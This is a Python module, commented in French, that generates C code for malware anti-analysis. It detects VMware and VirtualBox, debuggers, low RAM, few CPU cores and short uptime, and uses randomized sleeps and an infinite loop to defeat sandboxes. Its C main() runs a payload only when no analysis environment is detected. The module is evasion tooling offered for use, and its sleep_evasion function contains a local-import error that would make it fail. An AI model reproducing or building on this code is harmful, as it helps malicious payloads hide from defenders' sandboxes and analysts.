#!/usr/bin/env python3
"""
Sandbox Detection & Anti-Analysis
- Détection VM (VirtualBox, VMware, Hyper-V)
- Anti-debugging techniques
- Sleep evasion
- Environment checks
"""

import time
import random
import subprocess
from typing import Dict, List, Tuple

class SandboxDetector:
    """
    Détection d'environnements d'analyse
    VM, sandbox, debugger, etc.
    """
    
    @staticmethod
    def generate_c_code() -> str:
        """
        Génère du code C pour la détection de sandbox
        """
        code = '''#include <windows.h>
#include <stdio.h>
#include <intrin.h>

// VM Detection
BOOL IsVMwarePresent() {
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, 
        "HARDWARE\\\\DEVICEMAP\\\\Scsi\\\\Scsi Port 0\\\\Scsi Bus 0\\\\Target Id 0\\\\Logical Unit Id 0", 
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        
        char value[255];
        DWORD size = sizeof(value);
        if (RegQueryValueEx(hKey, "Identifier", NULL, NULL, (LPBYTE)&value, &size) == ERROR_SUCCESS) {
            if (strstr(value, "VMWARE") != NULL) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        RegCloseKey(hKey);
    }
    return FALSE;
}

BOOL IsVirtualBoxPresent() {
    HMODULE hMod = GetModuleHandle("VBoxGuest");
    if (hMod != NULL) return TRUE;
    
    hMod = GetModuleHandle("VBoxMouse");
    if (hMod != NULL) return TRUE;
    
    hMod = GetModuleHandle("VBoxSF");
    if (hMod != NULL) return TRUE;
    
    return FALSE;
}

// Debugger Detection
BOOL IsDebuggerPresentCheck() {
    return IsDebuggerPresent();
}

BOOL CheckRemoteDebugger() {
    BOOL isDebugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugged);
    return isDebugged;
}

BOOL CheckNtGlobalFlag() {
    PPEB peb = (PPEB)__readgsqword(0x60);
    return (peb->NtGlobalFlag & 0x70) != 0;
}

// Sandbox Detection
BOOL CheckRAMSize() {
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    
    // Less than 2GB RAM -> likely sandbox
    if (memInfo.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) {
        return TRUE;
    }
    return FALSE;
}

BOOL CheckCPUCores() {
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    
    // Less than 2 cores -> likely sandbox
    if (sysInfo.dwNumberOfProcessors < 2) {
        return TRUE;
    }
    return FALSE;
}

BOOL CheckUptime() {
    // Less than 10 minutes uptime -> likely sandbox
    if (GetTickCount() < 10 * 60 * 1000) {
        return TRUE;
    }
    return FALSE;
}

// Sleep Evasion
VOID TimedExecution() {
    // Random sleep to avoid sandbox time limits
    srand(GetTickCount());
    int sleepTime = (rand() % 5000) + 5000; // 5-10 seconds
    Sleep(sleepTime);
}

// Main detection function
BOOL IsSandboxed() {
    int detections = 0;
    
    if (IsVMwarePresent()) detections++;
    if (IsVirtualBoxPresent()) detections++;
    if (IsDebuggerPresentCheck()) detections++;
    if (CheckRemoteDebugger()) detections++;
    if (CheckNtGlobalFlag()) detections++;
    if (CheckRAMSize()) detections++;
    if (CheckCPUCores()) detections++;
    if (CheckUptime()) detections++;
    
    // If multiple detections, probably sandbox
    return detections >= 3;
}

// Example usage
int main() {
    if (IsSandboxed()) {
        printf("Sandbox detected - Exiting\\n");
        return 1;
    }
    
    printf("Clean environment - Executing payload\\n");
    // Execute payload here
    return 0;
}
'''
        return code
    
    @staticmethod
    def check_vm_windows() -> Dict[str, bool]:
        """Vérification VM depuis Python (Windows)"""
        results = {}
        
        try:
            # Vérifier processus VMware
            output = subprocess.run(['tasklist'], capture_output=True, text=True)
            results['vmware'] = 'vmtoolsd.exe' in output.stdout.lower()
            results['vbox'] = 'vboxservice.exe' in output.stdout.lower()
        except:
            pass
        
        return results
    
    @staticmethod
    def sleep_evasion(min_sec: int = 5, max_sec: int = 15) -> None:
        """
        Sleep avec variation pour contourner les sandboxes
        """
        # Sommeil aléatoire
        sleep_time = random.randint(min_sec, max_sec)
        time.sleep(sleep_time)
        
        # Vérification temporelle (si le temps passe trop vite -> sandbox)
        import time
        start = time.time()
        time.sleep(0.1)
        elapsed = time.time() - start
        
        if elapsed < 0.05:  # Temps accéléré -> sandbox
            # Boucle infinie pour bloquer l'analyse
            while True:
                pass